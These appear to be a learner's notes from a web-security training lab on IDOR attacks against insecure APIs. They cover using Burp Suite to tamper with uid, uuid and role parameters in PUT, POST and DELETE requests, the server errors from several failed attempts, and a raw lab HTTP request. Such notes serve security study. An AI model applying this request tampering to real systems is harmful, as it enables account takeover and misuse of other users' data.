# IDOR in Insecure APIs

IDOR Insecure Function Calls enable us to call APIs or execute functions as another user.

Use-cases :
- Change another user's private information
- Reset another user's password
- Buy items using another user's payment information

## Identifying Insecure APIs

- Using Burp Suite
- Identify PUT request (example : to the /profile/api.php/profile/1)
- Check the JSON parameters
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}

- Check if some information are taken from our parameters or cookie :

For example, if role is reflected from our cookie we will be able to set an arbitrary role

## Exploiting Insecure APIs

Examples of actions we could ty regarding the parameters which are passed in the request :

1. Change our uid to another user's uid, such that we can take over their accounts
2. Change another user's details, which may allow us to perform several web attacks
3. Create new users with arbitrary details, or delete existing users
4. Change our role to a more privileged role (e.g. admin) to be able to perform more actions

It does not work when we use :
PUT /profile/api.php/profile/1
and
"uid":2

--> Failed : uid mismatch (seem there is some backend controls)

Let's try :
PUT /profile/api.php/profile/2
and
"uid":2

--> Failed : uuid mismatch

Let's try another method :
POST /profile/api.php/profile/50
and
"uid":50

--> Failed : Creating new employees is for admins only

Same with delete :

--> Failed : Deleting new employees is for admins only

Change Role :
"role": "admin"
"role": "administrator"

--> Failed : Invalid role

## LAB

GET /profile/api.php/profile/5 HTTP/1.1
Host: 94.237.55.163:30646
Content-Length: 208
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-type: application/json
Accept: */*
Origin: http://94.237.55.163:30646
Referer: http://94.237.55.163:30646/profile/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: role=employee
Connection: close

{"uid":5,"uuid":"40f5888b67c748df7efba008e7c2f9d2","role":"employee","full_name":"Amy Lindon","email":"a_lindon@employees.htb","about":"A Release is like a boat. 80% of the holes plugged is not good enough."}


